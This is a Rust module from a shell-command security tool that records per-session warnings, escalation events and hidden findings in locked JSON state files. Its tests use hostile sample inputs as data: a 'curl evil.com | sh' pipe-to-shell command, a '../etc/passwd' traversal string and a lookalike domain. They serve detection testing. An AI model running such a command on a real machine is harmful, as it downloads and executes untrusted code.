//! Per-session warning accumulator.
//!
//! Tracks warnings across commands within a single shell session so that
//! escalation rules can detect repeated suspicious behavior.
//!
//! State is stored as JSON at `state_dir()/sessions/{session_id}.json`.
//! All I/O is best-effort: failures are silently ignored and never alter
//! the verdict or panic.

use std::collections::VecDeque;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::PathBuf;

use fs2::FileExt;
use serde::{Deserialize, Serialize};

use crate::verdict::{Evidence, Finding};

/// Maximum warning events retained per session.
const MAX_EVENTS: usize = 100;
/// Maximum escalation events retained per session.
const MAX_ESCALATION_EVENTS: usize = 20;
/// Maximum hidden events retained per session.
const MAX_HIDDEN_EVENTS: usize = 50;

/// Per-session warning accumulator.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionWarnings {
    pub session_id: String,
    pub session_start: String,
    pub total_warnings: u32,
    /// Aggregate hidden findings (for backward compat / quick total).
    #[serde(default)]
    pub hidden_findings: u32,
    /// Hidden findings broken down by severity (recorded at detection time).
    #[serde(default)]
    pub hidden_low: u32,
    #[serde(default)]
    pub hidden_info: u32,
    pub events: VecDeque<WarningEvent>,
    /// Escalation events: records when an escalation rule fired, scoped per
    /// (rule_id, domain) key. Used for cooldown matching.
    #[serde(default)]
    pub escalation_events: VecDeque<EscalationEvent>,
    /// Findings hidden by paranoia filtering, for `tirith warnings --hidden`.
    #[serde(default)]
    pub hidden_events: VecDeque<HiddenEvent>,
}

/// A single warning event within a session.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WarningEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub severity: String,
    pub title: String,
    pub command_redacted: String,
    pub domains: Vec<String>,
}

/// Records when an escalation rule fired, for cooldown scoping.
///
/// `rule_id` is the specific finding rule that crossed the threshold, or `"*"`
/// for wildcard aggregate escalations. `domain` is set only for `domain_scoped`
/// rules — one domain's escalation does not cool down other domains.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EscalationEvent {
    pub timestamp: String,
    pub rule_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
}

/// A finding that was hidden by paranoia filtering (recorded for `tirith warnings --hidden`).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HiddenEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub severity: String,
    pub title: String,
    pub command_redacted: String,
}

impl SessionWarnings {
    /// Create a new empty accumulator.
    fn new(session_id: &str) -> Self {
        Self {
            session_id: session_id.to_string(),
            session_start: chrono::Utc::now().to_rfc3339(),
            total_warnings: 0,
            hidden_findings: 0,
            hidden_low: 0,
            hidden_info: 0,
            events: VecDeque::new(),
            escalation_events: VecDeque::new(),
            hidden_events: VecDeque::new(),
        }
    }

    /// Count events matching `rule_id` within the last `window_minutes`.
    pub fn count_by_rule(&self, rule_id: &str, window_minutes: u64) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        self.events
            .iter()
            .filter(|e| e.rule_id == rule_id && e.timestamp.as_str() >= cutoff.as_str())
            .count() as u32
    }

    /// Count events matching both `rule_id` and `domain` within the window.
    pub fn count_by_rule_and_domain(
        &self,
        rule_id: &str,
        domain: &str,
        window_minutes: u64,
    ) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        let domain_lower = domain.to_lowercase();
        self.events
            .iter()
            .filter(|e| {
                e.rule_id == rule_id
                    && e.timestamp.as_str() >= cutoff.as_str()
                    && e.domains.iter().any(|d| d.to_lowercase() == domain_lower)
            })
            .count() as u32
    }

    /// Count all events within the window.
    pub fn count_all(&self, window_minutes: u64) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        self.events
            .iter()
            .filter(|e| e.timestamp.as_str() >= cutoff.as_str())
            .count() as u32
    }

    /// Top rules by frequency (descending).
    pub fn top_rules(&self) -> Vec<(String, u32)> {
        let mut counts = std::collections::HashMap::<String, u32>::new();
        for e in &self.events {
            *counts.entry(e.rule_id.clone()).or_default() += 1;
        }
        let mut sorted: Vec<_> = counts.into_iter().collect();
        sorted.sort_by(|a, b| b.1.cmp(&a.1));
        sorted
    }
}

/// Compute the RFC 3339 cutoff timestamp for windowed queries.
fn cutoff_time(window_minutes: u64) -> String {
    let cutoff =
        chrono::Utc::now() - chrono::Duration::minutes(window_minutes.min(u32::MAX as u64) as i64);
    cutoff.to_rfc3339()
}

/// Validate session_id and return the state file path.
///
/// Session IDs must be non-empty, <=128 chars, and contain only
/// `[a-zA-Z0-9_-]` to prevent path traversal.
pub fn session_state_path(session_id: &str) -> Option<PathBuf> {
    if session_id.is_empty() || session_id.len() > 128 {
        return None;
    }
    if !session_id
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        return None;
    }
    let state = crate::policy::state_dir()?;
    Some(state.join("sessions").join(format!("{session_id}.json")))
}

/// Load session warnings from disk. Returns an empty accumulator on any error.
///
/// Takes a shared lock so readers never observe the transient empty state
/// that occurs while `record_warning()` truncates and rewrites the file.
pub fn load(session_id: &str) -> SessionWarnings {
    let path = match session_state_path(session_id) {
        Some(p) => p,
        None => return SessionWarnings::new(session_id),
    };

    let file = match fs::File::open(&path) {
        Ok(f) => f,
        Err(_) => return SessionWarnings::new(session_id),
    };

    // Shared lock prevents reading mid-truncate from a concurrent writer.
    if fs2::FileExt::lock_shared(&file).is_err() && fs2::FileExt::try_lock_shared(&file).is_err() {
        return SessionWarnings::new(session_id);
    }

    use std::io::Read;
    let mut content = String::new();
    let result = (&file).read_to_string(&mut content);
    let _ = fs2::FileExt::unlock(&file);

    if result.is_err() || content.is_empty() {
        return SessionWarnings::new(session_id);
    }

    serde_json::from_str::<SessionWarnings>(&content).unwrap_or_else(|e| {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: corrupt state for '{}': {e} — resetting",
            session_id
        ));
        SessionWarnings::new(session_id)
    })
}

/// Record warning findings into the session accumulator.
///
/// Thin wrapper around `record_outcome` with no hidden findings.
pub fn record_warning(session_id: &str, findings: &[&Finding], cmd: &str, dlp_patterns: &[String]) {
    record_outcome(session_id, findings, &[], cmd, dlp_patterns);
}

/// Record warning findings and hidden findings into the session accumulator.
///
/// Hidden findings are actual `Finding` references (not just counts) so that
/// full event details can be stored for `tirith warnings --hidden`.
///
/// Delegates to [`with_session_locked`] for atomic lock-read-modify-write.
/// Never panics or alters the verdict on I/O failure.
pub fn record_outcome(
    session_id: &str,
    warn_findings: &[&Finding],
    hidden_findings_list: &[&Finding],
    cmd: &str,
    dlp_patterns: &[String],
) {
    if warn_findings.is_empty() && hidden_findings_list.is_empty() {
        return;
    }

    // Compute hidden counts from the actual findings list.
    let hidden_count = hidden_findings_list.len() as u32;
    let hidden_low = hidden_findings_list
        .iter()
        .filter(|f| f.severity == crate::verdict::Severity::Low)
        .count() as u32;
    let hidden_info = hidden_findings_list
        .iter()
        .filter(|f| f.severity == crate::verdict::Severity::Info)
        .count() as u32;

    // Pre-compute redacted command outside the lock to minimise hold time.
    let command_redacted = crate::redact::redact_command_text(cmd, dlp_patterns);
    let command_redacted = crate::util::truncate_bytes(&command_redacted, 120);
    let now = chrono::Utc::now().to_rfc3339();

    // Collect finding data we need so the closure does not borrow the slices.
    struct FindingData {
        rule_id: String,
        severity: String,
        title: String,
        domains: Vec<String>,
    }
    let finding_data: Vec<FindingData> = warn_findings
        .iter()
        .map(|f| FindingData {
            rule_id: f.rule_id.to_string(),
            severity: f.severity.to_string(),
            title: crate::util::truncate_bytes(&f.title, 120),
            domains: extract_domains_from_evidence(&f.evidence),
        })
        .collect();

    // Collect hidden finding data for HiddenEvent storage.
    let hidden_data: Vec<FindingData> = hidden_findings_list
        .iter()
        .map(|f| FindingData {
            rule_id: f.rule_id.to_string(),
            severity: f.severity.to_string(),
            title: crate::util::truncate_bytes(&f.title, 120),
            domains: Vec::new(), // not needed for hidden events
        })
        .collect();

    with_session_locked(session_id, |session| {
        // Increment hidden findings count
        session.hidden_findings = session.hidden_findings.saturating_add(hidden_count);
        session.hidden_low = session.hidden_low.saturating_add(hidden_low);
        session.hidden_info = session.hidden_info.saturating_add(hidden_info);

        // Append warning events
        for fd in &finding_data {
            let event = WarningEvent {
                timestamp: now.clone(),
                rule_id: fd.rule_id.clone(),
                severity: fd.severity.clone(),
                title: fd.title.clone(),
                command_redacted: command_redacted.clone(),
                domains: fd.domains.clone(),
            };
            session.events.push_back(event);
            session.total_warnings = session.total_warnings.saturating_add(1);
        }

        // Append hidden events
        for hd in &hidden_data {
            session.hidden_events.push_back(HiddenEvent {
                timestamp: now.clone(),
                rule_id: hd.rule_id.clone(),
                severity: hd.severity.clone(),
                title: hd.title.clone(),
                command_redacted: command_redacted.clone(),
            });
        }

        // Cap warning events
        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }

        // Cap hidden events
        while session.hidden_events.len() > MAX_HIDDEN_EVENTS {
            session.hidden_events.pop_front();
        }
    });
}

/// Record escalation events into the session accumulator.
///
/// Called from `post_process_verdict` after an escalation rule upgrades the
/// action. Must happen outside `record_outcome` because escalated blocks are
/// `Action::Block` which does not enter the Warn/WarnAck recording gate.
pub fn record_escalation_event(session_id: &str, hits: &[crate::escalation::EscalationHit]) {
    if hits.is_empty() {
        return;
    }

    let now = chrono::Utc::now().to_rfc3339();

    with_session_locked(session_id, |session| {
        for hit in hits {
            session.escalation_events.push_back(EscalationEvent {
                timestamp: now.clone(),
                rule_id: hit.rule_id.clone(),
                domain: hit.domain.clone(),
            });
        }
        // Cap escalation events
        while session.escalation_events.len() > MAX_ESCALATION_EVENTS {
            session.escalation_events.pop_front();
        }
    });
}

/// Shared helper: open session file, acquire exclusive lock, read or create
/// session state, call `mutate` to modify it, serialize and write back,
/// then unlock and run opportunistic GC.
///
/// All I/O is best-effort; failures are logged diagnostically and never panic.
fn with_session_locked<F>(session_id: &str, mutate: F)
where
    F: FnOnce(&mut SessionWarnings),
{
    let path = match session_state_path(session_id) {
        Some(p) => p,
        None => return,
    };

    // Ensure directory exists
    if let Some(parent) = path.parent() {
        if let Err(e) = fs::create_dir_all(parent) {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: cannot create state dir {}: {e}",
                parent.display()
            ));
            return;
        }
    }

    // Refuse to follow symlinks on Unix
    #[cfg(unix)]
    {
        match std::fs::symlink_metadata(&path) {
            Ok(meta) if meta.file_type().is_symlink() => {
                crate::audit::audit_diagnostic(format!(
                    "tirith: session: refusing to follow symlink at {}",
                    path.display()
                ));
                return;
            }
            _ => {}
        }
    }

    // Open file for read+write (atomic load-modify-write under lock).
    let mut open_opts = OpenOptions::new();
    open_opts.read(true).write(true).create(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        open_opts.mode(0o600);
        open_opts.custom_flags(libc::O_NOFOLLOW);
    }

    let file = match open_opts.open(&path) {
        Ok(f) => f,
        Err(e) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: cannot open {} — escalation may be impaired: {e}",
                path.display()
            ));
            return;
        }
    };

    // Harden permissions on existing files
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = file.set_permissions(std::fs::Permissions::from_mode(0o600));
    }

    // Acquire exclusive lock BEFORE reading — this is the atomicity guarantee.
    let locked = file.lock_exclusive().is_ok() || file.try_lock_exclusive().is_ok();
    if !locked {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: cannot lock {} — recording skipped",
            path.display()
        ));
        return;
    }

    // Read existing state under lock
    use std::io::Read;
    let mut content = String::new();
    let _ = (&file).read_to_string(&mut content);
    let mut session: SessionWarnings = if content.is_empty() {
        SessionWarnings::new(session_id)
    } else {
        serde_json::from_str(&content).unwrap_or_else(|e| {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: corrupt state for '{}': {e} — resetting",
                session_id
            ));
            SessionWarnings::new(session_id)
        })
    };

    // Let caller mutate the session state
    mutate(&mut session);

    let json = match serde_json::to_string(&session) {
        Ok(j) => j,
        Err(e) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: failed to serialize warnings: {e}"
            ));
            let _ = fs2::FileExt::unlock(&file);
            return;
        }
    };

    // Truncate + write under the same lock
    use std::io::Seek;
    if file.set_len(0).is_err() || (&file).seek(std::io::SeekFrom::Start(0)).is_err() {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: truncate/seek failed for {} — skipping write",
            path.display()
        ));
        let _ = fs2::FileExt::unlock(&file);
        return;
    }
    let mut writer = std::io::BufWriter::new(&file);
    if let Err(e) = writer.write_all(json.as_bytes()) {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: write failed for {}: {e}",
            path.display()
        ));
    }
    if let Err(e) = writer.flush() {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: flush failed for {}: {e}",
            path.display()
        ));
    }
    let _ = file.sync_all();
    let _ = fs2::FileExt::unlock(&file);

    // Opportunistic GC: clean up stale session files, rate-limited to once per hour.
    opportunistic_gc();
}

/// Extract hostnames from finding evidence.
pub fn extract_domains_from_evidence(evidence: &[Evidence]) -> Vec<String> {
    let mut domains = Vec::new();
    for ev in evidence {
        match ev {
            Evidence::Url { raw } => {
                if let Some(host) = extract_host(raw) {
                    domains.push(host);
                }
            }
            Evidence::HostComparison { raw_host, .. } => {
                domains.push(raw_host.to_lowercase());
            }
            _ => {}
        }
    }
    domains.sort();
    domains.dedup();
    domains
}

/// Extract host from a URL string.
fn extract_host(url: &str) -> Option<String> {
    if let Ok(parsed) = url::Url::parse(url) {
        return parsed.host_str().map(|h| h.to_lowercase());
    }
    // Schemeless fallback: take first segment before /
    let candidate = url.split('/').next()?;
    if candidate.contains('.') && !candidate.contains(' ') {
        let host = candidate.split(':').next().unwrap_or(candidate);
        return Some(host.to_lowercase());
    }
    None
}

/// Opportunistic garbage collection of stale session files.
///
/// Rate-limited to once per hour via a `.last_gc` marker file in the sessions
/// directory. Uses a 72-hour cutoff for stale sessions.
fn opportunistic_gc() {
    let gc_marker = match crate::policy::state_dir() {
        Some(d) => d.join("sessions").join(".last_gc"),
        None => return,
    };
    if let Ok(meta) = fs::metadata(&gc_marker) {
        if let Ok(modified) = meta.modified() {
            if let Ok(age) = modified.elapsed() {
                if age.as_secs() < 3600 {
                    return;
                }
            }
        }
    }
    // Touch the marker file before running GC (best-effort).
    let _ = fs::write(&gc_marker, "");
    gc_stale_sessions(72);
}

/// Remove session files older than `max_age_hours`.
pub fn gc_stale_sessions(max_age_hours: u64) {
    let state = match crate::policy::state_dir() {
        Some(s) => s,
        None => return,
    };
    let sessions_dir = state.join("sessions");
    let entries = match fs::read_dir(&sessions_dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    let max_age = std::time::Duration::from_secs(max_age_hours * 3600);
    let now = std::time::SystemTime::now();

    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
        }
        let meta = match fs::metadata(&path) {
            Ok(m) => m,
            Err(_) => continue,
        };
        let modified = match meta.modified() {
            Ok(t) => t,
            Err(_) => continue,
        };
        if let Ok(age) = now.duration_since(modified) {
            if age > max_age {
                let _ = fs::remove_file(&path);
            }
        }
    }
}

/// Delete a session file.
pub fn clear_session(session_id: &str) {
    if let Some(path) = session_state_path(session_id) {
        let _ = fs::remove_file(&path);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Evidence, Finding, RuleId, Severity};

    fn make_finding(rule_id: RuleId, severity: Severity) -> Finding {
        Finding {
            rule_id,
            severity,
            title: "Test finding".to_string(),
            description: "desc".to_string(),
            evidence: vec![Evidence::Url {
                raw: "https://evil.example.com/path".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    #[test]
    fn test_session_state_path_validation() {
        // Valid IDs
        assert!(session_state_path("abc-123_DEF").is_some());
        assert!(session_state_path("a").is_some());

        // Reject empty
        assert!(session_state_path("").is_none());

        // Reject path traversal
        assert!(session_state_path("../etc/passwd").is_none());
        assert!(session_state_path("foo/bar").is_none());
        assert!(session_state_path("..").is_none());

        // Reject special chars
        assert!(session_state_path("foo bar").is_none());
        assert!(session_state_path("foo.bar").is_none());

        // Reject too long
        let long_id = "a".repeat(129);
        assert!(session_state_path(&long_id).is_none());

        // Accept max length
        let max_id = "a".repeat(128);
        assert!(session_state_path(&max_id).is_some());
    }

    #[test]
    fn test_load_returns_default_on_missing() {
        let session = load("nonexistent-session-id-12345");
        assert_eq!(session.session_id, "nonexistent-session-id-12345");
        assert_eq!(session.total_warnings, 0);
        assert!(session.events.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn test_record_and_load_cycle() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());

        let dir = tempfile::tempdir().unwrap();
        let state_home = dir.path().join("state");
        unsafe { std::env::set_var("XDG_STATE_HOME", &state_home) };

        let session_id = "test-session-rec-001";

        // Record two findings
        let f1 = make_finding(RuleId::CurlPipeShell, Severity::High);
        let f2 = make_finding(RuleId::NonAsciiHostname, Severity::Medium);
        record_warning(session_id, &[&f1, &f2], "curl evil.com | sh", &[]);

        // Load and verify
        let session = load(session_id);
        assert_eq!(session.total_warnings, 2);
        assert_eq!(session.events.len(), 2);
        assert_eq!(session.events[0].rule_id, "curl_pipe_shell");
        assert_eq!(session.events[1].rule_id, "non_ascii_hostname");

        // Verify domains extracted
        assert!(session.events[0]
            .domains
            .contains(&"evil.example.com".to_string()));

        // Record more and verify accumulation
        let f3 = make_finding(RuleId::ShortenedUrl, Severity::Low);
        record_warning(session_id, &[&f3], "bit.ly/foo", &[]);

        let session = load(session_id);
        assert_eq!(session.total_warnings, 3);
        assert_eq!(session.events.len(), 3);

        // Clear and verify
        clear_session(session_id);
        let session = load(session_id);
        assert_eq!(session.total_warnings, 0);

        unsafe { std::env::remove_var("XDG_STATE_HOME") };
    }

    #[test]
    fn test_count_by_rule_with_window() {
        let mut session = SessionWarnings::new("test");
        // Add an event with a recent timestamp
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "curl_pipe_shell".to_string(),
            severity: "HIGH".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });
        // Add an event with an old timestamp (2 hours ago)
        let old_time = (chrono::Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
        session.events.push_back(WarningEvent {
            timestamp: old_time,
            rule_id: "curl_pipe_shell".to_string(),
            severity: "HIGH".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });

        // 60-min window should only catch the recent one
        assert_eq!(session.count_by_rule("curl_pipe_shell", 60), 1);
        // 180-min window should catch both
        assert_eq!(session.count_by_rule("curl_pipe_shell", 180), 2);
        // Different rule should match zero
        assert_eq!(session.count_by_rule("non_ascii_hostname", 180), 0);
    }

    #[test]
    fn test_count_by_rule_and_domain() {
        let mut session = SessionWarnings::new("test");
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "non_ascii_hostname".to_string(),
            severity: "MEDIUM".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec!["evil.com".to_string()],
        });
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "non_ascii_hostname".to_string(),
            severity: "MEDIUM".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec!["good.com".to_string()],
        });

        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "evil.com", 60),
            1
        );
        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "good.com", 60),
            1
        );
        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "other.com", 60),
            0
        );
    }

    #[test]
    fn test_count_all() {
        let mut session = SessionWarnings::new("test");
        for _ in 0..5 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: "any_rule".to_string(),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
        }
        assert_eq!(session.count_all(60), 5);
    }

    #[test]
    fn test_top_rules() {
        let mut session = SessionWarnings::new("test");
        for _ in 0..3 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: "rule_a".to_string(),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
        }
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "rule_b".to_string(),
            severity: "LOW".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });

        let top = session.top_rules();
        assert_eq!(top[0], ("rule_a".to_string(), 3));
        assert_eq!(top[1], ("rule_b".to_string(), 1));
    }

    #[test]
    fn test_event_cap() {
        let mut session = SessionWarnings::new("test");
        for i in 0..150 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: format!("rule_{i}"),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
            session.total_warnings += 1;
        }
        // Manually apply cap as record_warning would
        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }
        assert_eq!(session.events.len(), MAX_EVENTS);
        assert_eq!(session.total_warnings, 150);
    }

    #[test]
    fn test_extract_domains_from_evidence() {
        let evidence = vec![
            Evidence::Url {
                raw: "https://evil.example.com/path".to_string(),
            },
            Evidence::HostComparison {
                raw_host: "GITHUB.COM".to_string(),
                similar_to: "g1thub.com".to_string(),
            },
            Evidence::Text {
                detail: "irrelevant".to_string(),
            },
        ];
        let domains = extract_domains_from_evidence(&evidence);
        assert!(domains.contains(&"evil.example.com".to_string()));
        assert!(domains.contains(&"github.com".to_string()));
        assert_eq!(domains.len(), 2);
    }
}
